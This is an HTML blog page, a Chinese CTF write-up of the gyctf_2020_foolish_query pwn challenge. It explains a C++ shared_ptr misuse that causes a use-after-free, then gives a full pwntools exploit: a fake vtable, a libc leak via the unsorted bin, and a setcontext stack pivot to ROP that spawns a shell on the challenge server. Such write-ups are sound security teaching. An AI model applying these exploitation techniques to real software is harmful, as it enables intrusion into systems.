@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="首先，检查一下程序的保护机制   然后，我们用IDA分析一下，在Query的构造函数中，如果我们查询的name存在，则将对应的对象从容易里取出，获得其shared_ptr对象，关键在于调用了shared ptr的get函数，取得了对象的指针值，用这个指针值创建了一个新的shared_ptr对象。漏洞点在于，从一个shared_ptr对象里取得了被托管的对象的地址值创建了一个新的shared_ptr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="gyctf_2020_foolish_query(C++中的shared ptr指针的误用)">
+<meta property="og:url" content="https://github.com/ha1vk/2020/07/26/gyctf_2020_foolish_query/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="首先，检查一下程序的保护机制   然后，我们用IDA分析一下，在Query的构造函数中，如果我们查询的name存在，则将对应的对象从容易里取出，获得其shared_ptr对象，关键在于调用了shared ptr的get函数，取得了对象的指针值，用这个指针值创建了一个新的shared_ptr对象。漏洞点在于，从一个shared_ptr对象里取得了被托管的对象的地址值创建了一个新的shared_ptr">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/gyctf_2020_foolish_query/image1.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/gyctf_2020_foolish_query/image2.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/gyctf_2020_foolish_query/image3.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/gyctf_2020_foolish_query/image4.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/07/26/gyctf_2020_foolish_query/image5.png">
+<meta property="article:published_time" content="2020-07-26T11:33:11.000Z">
+<meta property="article:modified_time" content="2025-06-26T02:32:33.923Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="unsorted bin">
+<meta property="article:tag" content="UAF">
+<meta property="article:tag" content="C++ string">
+<meta property="article:tag" content="堆风水">
+<meta property="article:tag" content="C++ shared_ptr">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/ha1vk/2020/07/26/gyctf_2020_foolish_query/image1.png">
+
+<link rel="canonical" href="https://github.com/ha1vk/2020/07/26/gyctf_2020_foolish_query/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>gyctf_2020_foolish_query(C++中的shared ptr指针的误用) | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/07/26/gyctf_2020_foolish_query/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          gyctf_2020_foolish_query(C++中的shared ptr指针的误用)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-07-26 19:33:11" itemprop="dateCreated datePublished" datetime="2020-07-26T19:33:11+08:00">2020-07-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 10:32:33" itemprop="dateModified" datetime="2025-06-26T10:32:33+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>首先，检查一下程序的保护机制</p>
+<img src="/ha1vk/2020/07/26/gyctf_2020_foolish_query/image1.png" class="">
+
+<p>然后，我们用IDA分析一下，在Query的构造函数中，如果我们查询的name存在，则将对应的对象从容易里取出，获得其shared_ptr对象，关键在于<strong>调用了shared ptr的get函数，取得了对象的指针值</strong>，用这个指针值创建了一个新的shared_ptr对象。漏洞点在于，从一个shared_ptr对象里取得了被托管的对象的<strong>地址值</strong>创建了一个新的shared_ptr对象，因此，前面shard_ptr指针里的计数不会被传递给新创建的这个shared_ptr对象，因此这个局部的shared_ptr对象析构时，把受托管的对象也给free掉了。</p>
+<img src="/ha1vk/2020/07/26/gyctf_2020_foolish_query/image2.png" class="">
+
+<p>因此，我们第一次query，创建了一个对象，第二次query这个对象，将使得该对象被free，第三次query将使得程序崩溃，原因是结构体里的指针由于free被破坏了。经过分析，对象的结构体是这样的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">   <span class="type">void</span> *func_tables;</span><br><span class="line">   <span class="built_in">string</span> name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于UAF，我们可以通过feedback申请堆，将释放的这个结构体申请回来进行伪造。首先，我们通过feedback功能，可以直接获得堆地址</p>
+<img src="/ha1vk/2020/07/26/gyctf_2020_foolish_query/image3.png" class="">
+
+<p>那么我们把伪造的虚表存到堆里先。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_ZN9WordQueryD2Ev = <span class="number">0x000000000040BF00</span></span><br><span class="line">_ZN9WordQueryD0Ev = <span class="number">0x000000000040BF50</span></span><br><span class="line">_ZNK9WordQuery4evalERK9TextQuery = <span class="number">0x000000000040BDB0</span></span><br><span class="line">_ZNK9WordQuery3repB5cxx11Ev = <span class="number">0x000000000040BE08</span></span><br><span class="line">_Z11secertQueryv = <span class="number">0x0000000000402EA9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造虚表</span></span><br><span class="line">feedback(p64(_ZN9WordQueryD2Ev) + p64(_ZN9WordQueryD0Ev) + p64(_ZNK9WordQuery4evalERK9TextQuery) + p64(_ZNK9WordQuery3repB5cxx11Ev))</span><br></pre></td></tr></table></figure>
+
+<p>这个伪造的虚表与程序原来真正的虚表是一模一样的，因为第一步我们的目的不是执行代码，我们得伪造Node结构体里的string对象，进而能够读取任意地址，从而泄露libc地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">basic_query(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"><span class="comment">#UAF</span></span><br><span class="line">basic_query(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">feedback(p64(fake_vtable_addr) + p64(heap_addr - <span class="number">0x30</span>) + p64(<span class="number">0x100</span>) + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#remote</span></span><br></pre></td></tr></table></figure>
+
+<p>如上，我们这一步主要是控制了string对象， <img src="/ha1vk/2020/07/26/gyctf_2020_foolish_query/image4.png" class=""></p>
+<p>因为每次query，都会打印出name，因此控制name，我们可以读取堆里任意地址的数据，我们在后面再通过feedback功能，由于feedback里string对象的扩充，会得到unsorted bin，从而，我们进行query的时候可以泄露unsorted bin里的数据。我们只需要控制string对象里的length成员，即可控制数据泄露的长度。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#制造一个unsorted bin</span></span><br><span class="line">feedback(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x200</span>)</span><br><span class="line"><span class="comment">#泄露出数据</span></span><br><span class="line">basic_query(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">result = sh.recvuntil(<span class="string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&#x27;</span>,drop = <span class="literal">True</span>)</span><br><span class="line">main_arena_88 = u64(result[-<span class="number">8</span>:])</span><br></pre></td></tr></table></figure>
+
+<p>泄露出数据以后，由于找不到合适的one_gadget，因此，我们只能做栈迁移。通过调试，我们发现，在函数虚表里的第三个函数调用时，寄存器状态如下</p>
+<img src="/ha1vk/2020/07/26/gyctf_2020_foolish_query/image5.png" class="">
+
+<p>其中rax指向的就是这个对象，而[rax]指向的就是虚表。我们找到一个合适的gadget</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, qword ptr [rax] ; </span><br><span class="line">mov rax, qword ptr [rdi + <span class="number">0x38</span>] ; </span><br><span class="line">call qword ptr [rax + <span class="number">0x20</span>]</span><br></pre></td></tr></table></figure>
+
+<p>因为虚表指针我们可以任意控制，所以rdi的值，我们也可以任意控制，从而rax也可以控制，我们再结合setcontext，即可完成栈迁移，然后做ROP。因此，第二次虚表伪造，我们将第三个函数指针伪造为这个gadget的地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh = process(&#x27;./gyctf_2020_foolish_query&#x27;,env = &#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class="line"><span class="comment">#sh = process(&#x27;./gyctf_2020_foolish_query&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29002</span>)</span><br><span class="line"><span class="comment">#sh = remote(&#x27;127.0.0.1&#x27;,8666)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">malloc_hook_s = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">basic_query</span>(<span class="params">keyword</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;6. Exit&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Keyword:&#x27;</span>,keyword)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">feedback</span>(<span class="params">content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;6. Exit&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;You want to feedback huh?&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_ZN9WordQueryD2Ev = <span class="number">0x000000000040BF00</span></span><br><span class="line">_ZN9WordQueryD0Ev = <span class="number">0x000000000040BF50</span></span><br><span class="line">_ZNK9WordQuery4evalERK9TextQuery = <span class="number">0x000000000040BDB0</span></span><br><span class="line">_ZNK9WordQuery3repB5cxx11Ev = <span class="number">0x000000000040BE08</span></span><br><span class="line">_Z11secertQueryv = <span class="number">0x0000000000402EA9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造虚表</span></span><br><span class="line">feedback(p64(_ZN9WordQueryD2Ev) + p64(_ZN9WordQueryD0Ev) + p64(_ZNK9WordQuery4evalERK9TextQuery) + p64(_ZNK9WordQuery3repB5cxx11Ev))</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;reward: &#x27;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">fake_vtable_addr = heap_addr + <span class="number">0x50</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;fake_vtable_addr=&#x27;</span>,<span class="built_in">hex</span>(fake_vtable_addr)</span><br><span class="line">basic_query(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"><span class="comment">#UAF</span></span><br><span class="line">basic_query(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">feedback(p64(fake_vtable_addr) + p64(heap_addr - <span class="number">0x30</span>) + p64(<span class="number">0x100</span>) + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#remote</span></span><br><span class="line"><span class="comment">#制造一个unsorted bin</span></span><br><span class="line">feedback(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x200</span>)</span><br><span class="line"><span class="comment">#泄露出数据</span></span><br><span class="line">basic_query(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">result = sh.recvuntil(<span class="string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&#x27;</span>,drop = <span class="literal">True</span>)</span><br><span class="line">main_arena_88 = u64(result[-<span class="number">8</span>:])</span><br><span class="line"></span><br><span class="line">malloc_hook_addr = (main_arena_88 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + (malloc_hook_s &amp; <span class="number">0xFFF</span>)</span><br><span class="line">libc_base = malloc_hook_addr - malloc_hook_s</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000021102</span></span><br><span class="line"><span class="comment">#mov rdi, qword ptr [rax] ; mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x20]</span></span><br><span class="line">trans_reg = libc_base + <span class="number">0x0000000000136aa3</span></span><br><span class="line">setcontext_x = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">0x35</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;setcontext_x=&#x27;</span>,<span class="built_in">hex</span>(setcontext_x)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr=&#x27;</span>,<span class="built_in">hex</span>(system_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造虚表</span></span><br><span class="line">payload = <span class="string">&#x27;v&#x27;</span>*<span class="number">0x10</span> + p64(trans_reg) + p64(_ZNK9WordQuery3repB5cxx11Ev)</span><br><span class="line">payload = payload.ljust(<span class="number">0x38</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">payload += p64(heap_addr + <span class="number">0x32510</span>)</span><br><span class="line">payload += p64(setcontext_x)</span><br><span class="line">rop = p64(binsh_addr) + p64(system_addr)</span><br><span class="line">payload += rop</span><br><span class="line">payload = payload.ljust(<span class="number">0xA0</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">payload += p64(heap_addr + <span class="number">0x32538</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">feedback(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_vtable_addr = heap_addr + <span class="number">0x324F0</span></span><br><span class="line"></span><br><span class="line">feedback(p64(fake_vtable_addr) + p64(heap_addr + <span class="number">0x98</span>) + p64(<span class="number">0x8</span>) + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">basic_query(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/unsorted-bin/" rel="tag"># unsorted bin</a>
+              <a href="/ha1vk/tags/UAF/" rel="tag"># UAF</a>
+              <a href="/ha1vk/tags/C-string/" rel="tag"># C++ string</a>
+              <a href="/ha1vk/tags/%E5%A0%86%E9%A3%8E%E6%B0%B4/" rel="tag"># 堆风水</a>
+              <a href="/ha1vk/tags/C-shared-ptr/" rel="tag"># C++ shared_ptr</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/07/26/X-nuca_2018_revenge/" rel="prev" title="X-nuca_2018_revenge(控制程序流程的新姿势+多字节的xchg指令会清零寄存器高位)">
+      <i class="fa fa-chevron-left"></i> X-nuca_2018_revenge(控制程序流程的新姿势+多字节的xchg指令会清零寄存器高位)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/07/26/ASIS_2017_Babyheap_Windows_unlink/" rel="next" title="ASIS_2017_Babyheap_Windows_unlink">
+      ASIS_2017_Babyheap_Windows_unlink <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
